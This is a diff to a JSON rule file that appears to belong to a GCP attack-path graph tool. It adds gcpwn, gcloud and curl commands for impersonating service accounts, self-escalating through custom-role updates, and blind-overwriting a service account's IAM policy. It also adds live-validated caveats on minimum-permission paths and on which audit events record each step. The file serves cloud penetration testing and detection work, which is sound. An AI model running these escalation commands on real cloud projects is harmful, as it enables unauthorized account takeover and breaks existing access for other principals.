@@ -8,7 +8,14 @@
       "default_include",
       "require_node_sa",
       "description",
-      "example_command"
+      "example_command",
+      "example_gcpwn_command",
+      "example_gcloud_command",
+      "example_curl_command",
+      "general_caveats",
+      "example_gcpwn_command_caveats",
+      "example_gcloud_command_caveats",
+      "example_curl_command_caveats"
     ],
     "require_node_sa": "Boolean (single-perm only). When true, the edge only fires against k8scluster resources that have at least one node pool with a non-default service account attached (config_service_account in gke_node_pools). Meaningless attack paths to clusters that run as Compute Engine default SA are suppressed.",
     "default_include": "Boolean. When true, this rule is loaded in the DEFAULT edge set even though its category is not in the default category selection (priv_escalation). Used to keep a single high-value resource-access edge (CAN_READ_SECRET_DATA) on by default while the rest of sensitive_resource_access stays opt-in via --edge-categories. Rules flagged default_include always load unless a category filter would otherwise include them anyway.",
@@ -59,7 +66,27 @@
         ],
         "on": "service-account",
         "description": "Generate a short-lived OAuth 2.0 access token for the target service account, immediately assuming its GCP identity.",
-        "example_command": "modules run exploit_generate_access_token --target-sa {target_sa} --project-id {project_id}"
+        "example_command": "modules run exploit_generate_access_token --target-sa {target_sa} --project-id {project_id}",
+        "example_gcpwn_command": "modules run exploit_generate_access_token --target-sa {target_sa} --project-id {project_id}",
+        "example_gcloud_command": "gcloud auth print-access-token --impersonate-service-account={target_sa}",
+        "example_curl_command": "curl -sS -X POST -H \"Authorization: Bearer $(gcloud auth print-access-token)\" -H \"Content-Type: application/json\" -d '{\"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"]}' \"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{target_sa}:generateAccessToken\"",
+        "general_caveats": [
+          "The minted token is short-lived (1 hour by default; up to 12 hours only when the org allows constraints/iam.allowServiceAccountCredentialLifetimeExtension for the SA). Re-mint to maintain access while the grant persists.",
+          "Impersonation inherits whatever the target SA holds at mint time; it grants no fixed permission set and no persistence beyond the grant itself.",
+          "roles/editor and roles/viewer on the target SA do NOT include secretmanager.versions.access, so reaching secret payloads requires the target to separately hold roles/secretmanager.secretAccessor.",
+          "Each mint writes a GenerateAccessToken event to iamcredentials.googleapis.com Data Access audit logs; these are not enabled by default, but where they are, this is a high-signal detection point."
+        ],
+        "example_gcpwn_command_caveats": [],
+        "example_gcloud_command_caveats": [
+          "Your active gcloud/ADC identity must be the principal that holds getAccessToken on the target SA; a mismatch returns PERMISSION_DENIED.",
+          "For service-account chaining, pass a comma-separated delegation chain (--impersonate-service-account=intermediate_sa,target_sa); a single value only works when your own identity holds the grant directly.",
+          "The printed token carries cloud-platform scope by default; use --scopes to narrow it."
+        ],
+        "example_curl_command_caveats": [
+          "The Authorization bearer must be a token for the principal holding getAccessToken on the target SA (here sourced from your own identity via gcloud auth print-access-token).",
+          "The projects/- wildcard resolves the SA by email, so no project id is needed in the URL path; the SA email must be URL-safe.",
+          "The scope array is required in the request body; the minted token is returned in the response's accessToken field (expireTime gives its lifetime)."
+        ]
       },
       "CAN_CREATE_SA_OIDC_TOKEN": {
         "permissions": [
@@ -82,14 +109,32 @@
         "permissions": [
           "iam.roles.update"
         ],
-        "on": "project",
+        "target_selector": {"mode": "resource_types", "resource_types": ["org", "folder", "project", "service-account", "secrets"]},
+        "scope_only": true,
         "prerequisite_binding": "source_must_hold_custom_role",
-        "description": "Update a custom IAM role that the attacker already holds a binding to in the project, adding any desired permission (e.g., iam.serviceAccounts.actAs, resourcemanager.projects.setIamPolicy). Effective when the attacker holds a binding to the custom role being updated; updating a custom role only benefits principals who hold that role. Documented in Rhino Security Labs GCP IAM privilege escalation research.",
-        "example_command": "gcloud iam roles update CUSTOM_ROLE --project=PROJECT_ID --add-permissions=iam.serviceAccounts.actAs",
+        "description": "Update a custom IAM role that the attacker already holds a binding to, adding any desired permission (e.g., iam.serviceAccounts.actAs, resourcemanager.projects.setIamPolicy). The edge fires for each scope where the principal holds the custom role in a binding (org, folder, project, service account, or secret); updating the role benefits all scopes where it is held.",
+        "example_command": "modules run exploit_update_custom_role --target-role {role_name} --add-permission iam.serviceAccounts.actAs",
+        "example_gcpwn_command": "modules run exploit_update_custom_role --target-role {role_name} --add-permission iam.serviceAccounts.actAs",
+        "example_gcloud_command": "gcloud iam roles update {custom_role_id} --project={project_id} --add-permissions=iam.serviceAccounts.actAs",
+        "example_curl_command": "curl -sS -X PATCH -H \"Authorization: Bearer $(gcloud auth print-access-token)\" -H \"Content-Type: application/json\" -d '{\"includedPermissions\":[\"iam.roles.update\",\"iam.serviceAccounts.actAs\"]}' \"https://iam.googleapis.com/v1/projects/{project_id}/roles/{custom_role_id}?updateMask=includedPermissions\"",
         "via": "capability",
-        "status": "PROPOSED",
-        "caveats": [
-          "Only useful if the attacker already holds a binding to the specific custom role being updated. The graph builder should verify this prerequisite before emitting this edge."
+        "status": "CONFIRMED",
+        "general_caveats": [
+          "Self-escalation: update a custom role your principal is already bound to, adding any permission (e.g. iam.serviceAccounts.actAs, resourcemanager.projects.setIamPolicy); because you hold the role, the new permission becomes yours -- then exploit it (actAs -> CAN_CREATE_SA_ACCESS_TOKEN; setIamPolicy -> CAN_MODIFY_SA_IAM).",
+          "Only a real escalation when the principal holds a binding to the custom role being updated; the graph gates this via prerequisite_binding=source_must_hold_custom_role (a principal holding iam.roles.update only via a predefined role is suppressed). The edge targets the resource where the custom-role binding is held (project-scope binding -> project target, SA-scope binding -> that SA, etc.).",
+          "The edge is defined by iam.roles.update alone, but the read-modify-write tools (the gcpwn module and gcloud --add-permissions) ALSO require iam.roles.get to read the role first; only the raw roles.patch REST call works with iam.roles.update alone. Live-validated.",
+          "GCP roles.patch REPLACES includedPermissions with exactly what you send (not an append). The gcpwn module and gcloud --add-permissions both do GetRole first, then patch with existing_perms + new_perm, so all existing permissions are preserved. Sending only the target permission via raw roles.patch silently wipes all other permissions on the role. Live-validated: gcpwn module preserved 9 existing permissions when adding a 10th; raw roles.patch with one permission left only that one.",
+          "Updating the role changes permissions for EVERY principal that holds a binding to it, not just the attacker. If the role has many holders, dropping permissions to minimize the payload (via raw roles.patch) may cause collateral breakage. The gcpwn module preserves existing permissions to avoid this.",
+          "Logged as google.iam.admin.v1.UpdateRole in Cloud Audit Logs; adding high-value permissions to a widely-held custom role is high-signal."
+        ],
+        "example_gcpwn_command_caveats": [
+          "The module does a read-modify-write (GetRole then patch) with no blind fallback, so it needs iam.roles.get in addition to iam.roles.update; with only iam.roles.update it fails at GetRole with 403 'iam.roles.get'. Live-validated."
+        ],
+        "example_gcloud_command_caveats": [
+          "gcloud iam roles update --add-permissions reads the role first (iam.roles.get) before patching, so it needs iam.roles.get in addition to iam.roles.update. With only iam.roles.update, use the raw roles.patch REST call (example_curl_command). Live-validated."
+        ],
+        "example_curl_command_caveats": [
+          "roles.patch with updateMask=includedPermissions and a from-scratch list needs ONLY iam.roles.update, no iam.roles.get -- the minimum-permission path (confirmed HTTP 200). Since you cannot read the current role, include iam.roles.update plus your target permission; any other existing permissions on the role are dropped."
         ]
       },
       "CAN_MODIFY_PROJECT_IAM": {
@@ -127,6 +172,26 @@
         "on": "service-account",
         "description": "Set the IAM policy on the target service account. Use set-iam-policy (not add-iam-policy-binding which also needs getIamPolicy) to grant yourself roles/iam.serviceAccountTokenCreator directly on the SA, then generate a token. No actAs required — tokenCreator is a separate mechanism.",
         "example_command": "modules run exploit_gcp_setiampolicy --service service_account --service-account-email {target_sa} --member serviceAccount:ATTACKER_SA_EMAIL --role roles/iam.serviceAccountTokenCreator && modules run exploit_generate_access_token --target-sa {target_sa} --project-id {project_id}",
+        "example_gcpwn_command": "modules run exploit_gcp_setiampolicy --service service_account --service-account-email {target_sa} --member serviceAccount:ATTACKER_SA_EMAIL --role roles/iam.serviceAccountTokenCreator --overwrite",
+        "example_gcloud_command": "printf '{\"bindings\":[{\"role\":\"roles/iam.serviceAccountTokenCreator\",\"members\":[\"serviceAccount:ATTACKER_SA_EMAIL\"]}]}' > policy.json && gcloud iam service-accounts set-iam-policy {target_sa} policy.json --project={project_id}",
+        "example_curl_command": "curl -sS -X POST -H \"Authorization: Bearer $(gcloud auth print-access-token)\" -H \"Content-Type: application/json\" -d '{\"policy\":{\"bindings\":[{\"role\":\"roles/iam.serviceAccountTokenCreator\",\"members\":[\"serviceAccount:ATTACKER_SA_EMAIL\"]}]}}' \"https://iam.googleapis.com/v1/projects/{project_id}/serviceAccounts/{target_sa}:setIamPolicy\"",
+        "general_caveats": [
+          "Two-step escalation: setIamPolicy to grant your attacker principal roles/iam.serviceAccountTokenCreator (or iam.serviceAccounts.getAccessToken) on the target SA, then mint a token for it (see CAN_CREATE_SA_ACCESS_TOKEN). No actAs required — tokenCreator is a separate mechanism.",
+          "With ONLY setIamPolicy you cannot read the current policy (getIamPolicy is denied), so every method here BLIND-OVERWRITES the SA's IAM policy and replaces all existing bindings. Include existing bindings if you can enumerate them, or accept the clobber (possible lockout).",
+          "Live-validated: a principal holding only iam.serviceAccounts.setIamPolicy on the target SA granted itself tokenCreator then impersonated the SA, yielding full project admin (target held roles/owner).",
+          "Logged as google.iam.admin.v1.SetIAMPolicy on the service account; adding tokenCreator to an SA that holds elevated roles is high-signal."
+        ],
+        "example_gcpwn_command_caveats": [
+          "With only setIamPolicy the module's default read-modify-write (it calls getIamPolicy first) is denied; pass --overwrite to force a blind setIamPolicy, which replaces the SA's entire IAM policy. Live-validated."
+        ],
+        "example_gcloud_command_caveats": [
+          "Do NOT use `gcloud iam service-accounts add-iam-policy-binding` — it reads the policy first and also requires iam.serviceAccounts.getIamPolicy, which is PERMISSION_DENIED when you hold only setIamPolicy (confirmed live). Use `set-iam-policy` with a policy file instead.",
+          "A policy file that omits `etag` performs a blind overwrite (works with only setIamPolicy) and replaces all existing bindings on the SA."
+        ],
+        "example_curl_command_caveats": [
+          "Omitting `etag` from the policy blind-overwrites the SA's IAM policy (works with only setIamPolicy — confirmed HTTP 200) and replaces existing bindings.",
+          "After the policy update, mint the target's token with generateAccessToken (the CAN_CREATE_SA_ACCESS_TOKEN example_curl_command)."
+        ],
         "status": "CONFIRMED",
         "sa_token_theft_without_actas": true
       },
